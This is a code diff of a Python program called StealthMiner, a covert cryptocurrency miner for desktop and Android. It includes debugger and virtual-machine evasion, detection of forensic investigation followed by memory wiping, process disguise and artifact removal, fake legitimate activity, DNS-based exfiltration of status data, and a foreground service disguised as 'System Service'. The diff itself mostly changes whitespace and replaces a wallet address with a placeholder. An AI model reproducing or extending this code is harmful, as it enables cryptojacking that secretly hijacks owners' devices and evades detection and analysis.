@@ -1444,7 +1443,7 @@ class StealthMiner:
             "session_id": str(uuid.uuid4()),
             "last_job_id": hashlib.sha256(os.urandom(32)).hexdigest()
         }
-    
+
     def _generate_workload_patterns(self):
         patterns = []
         for _ in range(8):
@@ -1459,16 +1458,16 @@ class StealthMiner:
                 'phase': phase
             })
         return patterns
-    
+
     def calculate_hash(self, data: bytes, difficulty: float) -> Dict[str, Any]:
         nonce = struct.pack('<Q', random.randint(0, 2**64 - 1))
         target = bytes([255] * (32 - int(difficulty * 32))) + bytes([0] * int(difficulty * 32))
-        
+
         for _ in range(int(1000 * difficulty)):
             combined = data + nonce + struct.pack('<Q', _)
             result = hashlib.sha256(combined)
             result2 = hashlib.sha256(result.digest())
-            
+
             if result2.digest() < target:
                 return {
                     "success": True,
@@ -1476,11 +1475,11 @@ class StealthMiner:
                     "hash": result2.hexdigest(),
                     "iterations": _
                 }
-            
+
             nonce = struct.pack('<Q', _ + 1)
-        
+
         return {"success": False, "iterations": int(1000 * difficulty)}
-    
+
     def simulate_mining(self, intensity: float):
         while self.active and self.running and intensity > 0.01:
             try:
@@ -1504,7 +1503,7 @@ class StealthMiner:
                 time.sleep(random.uniform(0.1, 0.5) / max(1 + intensity, 0.01))
             except Exception:
                 time.sleep(1)
-    
+
     def _submit_mining_results(self):
         if not self.hashrate_history:
             return
@@ -1567,34 +1566,34 @@ class StealthMiner:
     def adjust_workload(self):
         pattern_idx = 0
         activation_level = 0
-        
+
         while self.running:
             try:
                 t = time.time()
-                
+
                 self.usage_learner.learn_user_pattern()
-                
+
                 orchestrated_intensity = self.orchestrator.calculate_mining_intensity()
-                
+
                 if self.forensic_detector.is_investigation_active():
                     self.memory_storage.wipe()
                     orchestrated_intensity = 0
                     self.orchestrator.risk_level = 100
                     time.sleep(30)
                     continue
-                
+
                 if self.anti_analysis.detect_debugger() or self.anti_analysis.detect_vm():
                     orchestrated_intensity = 0
                     self.orchestrator.risk_level = 100
                     time.sleep(30)
                     continue
-                
+
                 power_decision = self.smart_power_decision()
                 if power_decision == 0:
                     orchestrated_intensity = 0
                 elif power_decision <= 3:
                     orchestrated_intensity = min(orchestrated_intensity, 5.0)
-                
+
                 thermal_decision = self.thermal_adaptive_mining()
                 if thermal_decision == 0:
                     orchestrated_intensity = 0
@@ -1602,37 +1601,37 @@ class StealthMiner:
                     continue
                 elif thermal_decision <= 10:
                     orchestrated_intensity = min(orchestrated_intensity, 10.0)
-                
+
                 if self.process_monitor.detect_realtime_communication():
                     orchestrated_intensity = 0
                     self.orchestrator.risk_level = 100
                 else:
                     self.orchestrator.risk_level = max(0, self.orchestrator.risk_level - 5)
-                
+
                 if self.screen_monitor.is_screen_locked_or_off():
                     orchestrated_intensity = min(orchestrated_intensity * 1.5, 80.0)
-                
+
                 optimal_window = self.usage_learner.get_optimal_mining_windows()
                 if optimal_window == 'DEEP_SLEEP':
                     orchestrated_intensity = min(orchestrated_intensity * 1.3, 80.0)
                 elif optimal_window == 'WORK_HOURS':
                     orchestrated_intensity = min(orchestrated_intensity, 15.0)
-                
+
                 self.current_intensity = orchestrated_intensity
-                
+
                 if orchestrated_intensity < 0.5:
                     if self.active:
                         self.deactivate_mining()
                     self.orchestrator.fake_legitimate_activity()
                     time.sleep(random.uniform(5, 15))
                     continue
-                
+
                 activation_trigger = self.timing.should_activate()
                 if activation_trigger >= 0:
                     activation_level = min(1.0, activation_level + 0.1)
                 else:
                     activation_level = max(0.03, activation_level - 0.02)
-                
+
                 if orchestrated_intensity > 1.0:
                     if not self.active:
                         self.activate_mining()
@@ -1655,9 +1654,9 @@ class StealthMiner:
                 else:
                     if self.active:
                         self.deactivate_mining()
-                
+
                 pattern_idx = (pattern_idx + 1) % len(self.workload_patterns)
-                
+
                 if random.random() < 0.05 and self.adaptive_network.should_communicate_now():
                     self.dns_exfil.exfiltrate(
                         json.dumps({
@@ -1666,17 +1665,17 @@ class StealthMiner:
                             "intensity": self.current_intensity
                         }).encode()
                     )
-                
+
                 sleep_time = random.uniform(1, 3)
                 if self.current_intensity > 50:
                     sleep_time = random.uniform(0.5, 1.5)
                 elif self.current_intensity < 5:
                     sleep_time = random.uniform(5, 10)
                 time.sleep(sleep_time)
-                
+
             except Exception:
                 time.sleep(5)
-    
+
     def detect_human_activity(self) -> bool:
         try:
             if ANDROID_AVAILABLE:
@@ -1692,21 +1691,21 @@ class StealthMiner:
         except:
             pass
         return True
-    
+
     def activate_mining(self):
         self.active = True
         self.connection_string = self.connection_mgr.get_connection_string()
         self.proc_disguise.randomize_disguise()
-    
+
     def deactivate_mining(self):
         self.active = False
         self._clean_threads()
         self.payload_mgr.remove_artifacts()
-    
+
     def reduce_activity(self):
         self._clean_threads()
         time.sleep(0.5)
-    
+
     def start(self):
         if self.anti_analysis.detect_debugger():
             time.sleep(random.uniform(60, 300))
@@ -1716,32 +1715,32 @@ class StealthMiner:
                     pass
                 else:
                     sys.exit(0)
-        
+
         if self.anti_analysis.detect_vm():
             time.sleep(random.uniform(300, 900))
             if random.random() < 0.7:
                 while self.anti_analysis.detect_vm():
                     time.sleep(3600)
-        
+
         if not self.anti_analysis.check_uptime():
             time.sleep(random.uniform(600, 1800))
-        
+
         if self.forensic_detector.is_investigation_active():
             time.sleep(random.uniform(1800, 3600))
-        
+
         activation_time = self.env_fp.get_activation_time()
         current_time = int(time.time())
         if current_time < activation_time:
             sleep_time = activation_time - current_time
             time.sleep(sleep_time)
-        
+
         self.running = True
         monitor = threading.Thread(target=self.adjust_workload, daemon=True)
         monitor.start()
-        
+
         cleanup = threading.Thread(target=self.periodic_cleanup, daemon=True)
         cleanup.start()
-        
+
         try:
             while self.running:
                 time.sleep(10)
@@ -1750,7 +1749,7 @@ class StealthMiner:
             self.deactivate_mining()
         except Exception:
             self.running = False
-    
+
     def periodic_cleanup(self):
         while self.running:
             time.sleep(random.uniform(600, 1800))
@@ -1760,7 +1759,7 @@ class StealthMiner:
             self._clean_threads()
             if not self.forensic_detector.is_investigation_active():
                 self.usage_learner._save_history()
-    
+
     def stop(self):
         self.running = False
         self.deactivate_mining()
@@ -1794,7 +1793,7 @@ class AntiAnalysis:
         ]
         self._decoded_vm_procs = [p.decode() for p in self.vm_processes]
         self._decoded_sandbox = [s.decode() for s in self.sandbox_blacklist]
-        
+
     def check_uptime(self) -> bool:
         try:
             uptime_path = '/proc/uptime'
@@ -1841,7 +1840,7 @@ class AntiAnalysis:
                                 return True
                     except:
                         pass
-            
+
             dmi_paths = [
                 '/sys/class/dmi/id/product_name',
                 '/sys/class/dmi/id/sys_vendor',
@@ -1866,7 +1865,7 @@ class AndroidServiceWrapper:
         self.notification_id = 1001
         self.channel_id = "system_service_channel"
         self.running = False
-        
+
     def on_start(self):
         if not self.service:
             return False
@@ -1875,12 +1874,12 @@ class AndroidServiceWrapper:
         self.start_mining()
         self.running = True
         return True
-    
+
     def on_stop(self):
         self.running = False
         self.stop_mining()
         self.stop_foreground()
-        
+
     def _create_notification_channel(self):
         if self.service and Build_VERSION.SDK_INT >= 26:
             try:
@@ -1895,26 +1894,26 @@ class AndroidServiceWrapper:
                     manager.createNotificationChannel(channel)
             except Exception:
                 pass
-    
+
     def start_foreground(self):
         if not self.service:
             return False
-            
+
         try:
             intent = Intent(self.service, self.service.getClass())
-            
+
             flags = PendingIntent.FLAG_UPDATE_CURRENT
             if Build_VERSION.SDK_INT >= 31:
                 flags = flags | 0x4000000
-            
+
             pending_intent = PendingIntent.getActivity(
                 self.service, 0, intent, flags
             )
-            
+
             builder = NotificationBuilder(self.service, self.channel_id)
             builder.setContentTitle(AndroidString("System Service"))
             builder.setContentText(AndroidString("Running background operations"))
-            
+
             try:
                 app_info = self.service.getApplicationInfo()
                 icon_id = app_info.icon
@@ -1926,16 +1925,16 @@ class AndroidServiceWrapper:
                     builder.setSmallIcon(0x0108021)
                 except:
                     pass
-            
+
             builder.setContentIntent(pending_intent)
             builder.setOngoing(True)
-            
+
             notification = builder.build()
             self.service.startForeground(self.notification_id, notification)
             return True
         except Exception:
             return False
-    
+
     def stop_foreground(self):
         if self.service:
             try:
@@ -1943,7 +1942,7 @@ class AndroidServiceWrapper:
                 self.service.stopSelf()
             except:
                 pass
-    
+
     def start_mining(self):
         if not self.miner and WALLET_ADDRESS != "YOUR_WALLET_ADDRESS_HERE":
             self.miner = StealthMiner(WALLET_ADDRESS)
@@ -1951,17 +1950,17 @@ class AndroidServiceWrapper:
             mining_thread.start()
             return True
         return False
-    
+
     def stop_mining(self):
         if self.miner:
             self.miner.stop()
             self.miner = None
 
 if __name__ == "__main__":
-    if WALLET_ADDRESS == "428n5oBUQPA1rGPfvFF13f4C4TJd1XsX6EHihdqNxoTnKk8tXGFNsCHS3oketz7YBd1wJga8Q96ikgg4v1Vz7xv7VLMEevN":
+    if WALLET_ADDRESS == "YOUR_WALLET_ADDRESS_HERE":
         print("Please set your wallet address in the WALLET_ADDRESS variable")
         sys.exit(1)
-    
+
     if ANDROID_AVAILABLE and ANDROID_SERVICE:
         wrapper = AndroidServiceWrapper()
         wrapper.on_start()
